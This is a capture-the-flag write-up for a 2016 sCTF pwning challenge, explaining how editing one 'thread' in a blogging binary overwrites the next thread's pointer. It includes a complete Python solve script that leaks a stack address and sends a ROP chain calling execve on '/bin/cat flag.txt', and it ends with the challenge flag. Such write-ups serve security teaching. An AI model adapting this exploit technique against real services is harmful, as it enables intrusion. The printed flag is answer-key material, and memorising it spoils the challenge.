## pwn3 - 160 (Pwning) ##
#### Writeup by r3ndom_ #####
Created: 2016-4-15

### Problem ###
A nice, simple blogging system. Have fun!
`nc problems2.2016q1.sctf.io 1339`

### Hint ###
If nobody can figure it out, I'll consider giving a hint ;)

## Answer ##

### Overview ###
Figure out how to cause a buffer overflow and create a system call for execve on `/bin/cat flag.txt`

### Details ###

This program had a way bigger vulnerable function than the rest so I won't be putting it in here, but the jist is that it had a menu for adding, editing, and printing "threads".

The vulnerability lies within the editing of a thread as they are placed on the stack in a more memory efficient way which allows for overwrites of following threads.

Once two threads have been created the first one can be edited to have more info than previously contained, this will overwrite the id and next pointer and potentially more of the data of the thread. 

However my exploit is dependant on the stack pointer so I made a script to be able to grab the stack pointer when the first next address is printed from the list of threads. Every other stack address is calculated relative to that.

Heres my commented solve script:

```python
rop = ''

import struct
def get_addr(addr):
	return struct.pack('<L', addr)

import socket

# My local first address, for testing.
first_addr = 0xffff45d0

# Let's sploit
sock = socket.socket()
sock.connect(('problems2.2016q1.sctf.io', 1339))

wr = sock.send
sock.recv(8192)
sock.recv(8192)
print 'writing'
# Create two threads.
wr('1\nad\nasd\nasd\n1\nasd\nasd\nasd\n')
sock.recv(8192)
wr('3\n')
sock.recv(8192)

# Get the stack ptr
outpt = str(sock.recv(8192))
print outpt
adr = outpt.find(': 0x')
outpt = outpt[adr+4:outpt.find('\n',adr)]
print outpt
first_addr = int(outpt,16)

# Set the next ptr of the second thread.
wr('2\n0\nAAAAAAB' + get_addr(first_addr - (0xffff45d0-0xffff4060) - (0x65)) + '\n')
print sock.recv(8192)

# To avoid getting carpal tunnel from writing 'get_addr' so many times
ga = get_addr

# Rop equivalent of a nop sled to allow the code after the fgets
# to write to some memory in the .bss section
rop += (ga(0x806f511) + (ga(0x80ec170) + ga(0x80ec169)))*5

# Write "/bin/cat",0,"flag.txt",0 somewhere
CAT = '/bin/cat\0'
FLAGTXT = 'flag.txt\0'
MEM = CAT+FLAGTXT
BIN_SH = 0x80ec190
rop += ga(0x804fbf0) + ga(0x8049408) + ga(BIN_SH) + ga(len(MEM)+1) + ga(0x80eb360)

MEM += ga(BIN_SH) + ga(BIN_SH+len(CAT)) + ga(0)
rop += ga(0x804fbf0) + ga(0x8049408) + ga(BIN_SH-13) + ga(13) + ga(0x80eb360)

# Set eax to oxb
rop += ga(0x80bb926) + ga(0xb)
# Set ecx and ebx
rop += ga(0x806f511) + ga(BIN_SH-13) + ga(BIN_SH)

# Set edx to some shit
rop += ga(0x806f4ea) + ga(0x80ec0b0)

# int 0x80
rop += ga(0x806fbc0)

# Add another thread so that the thread count is 3 and we can edit the third thread (pointed to by our modified next pointer) and rop chain.
wr('1\na\nd\nasd\n')
wr('2\n8\n' + rop + '\n')
wr(MEM + '\n')

# Get all the output from the server.
print sock.recv(8192)
print sock.recv(8192)
print sock.recv(8192)
print sock.recv(8192)```

Some other notes:

I wrote my code to exploit the return address of the edit thread function rather than the menu, this is so that I have less worries about the space on the stack and also I don't need to worry about the stack cookie if I'm off by a few bytes (I do really shite arithmetic).

Running that script alone will garner the flag.

Sorry for the kinda lack of analysis, the function is just massive and I don't want to bloat the write up size, if you download the binary the function is `menu()` and theres just a huge buffer for threads on the stack.

### Flag ###

The flag is `sctf{h34p_0n_th3_st4ck_EZPZ}`

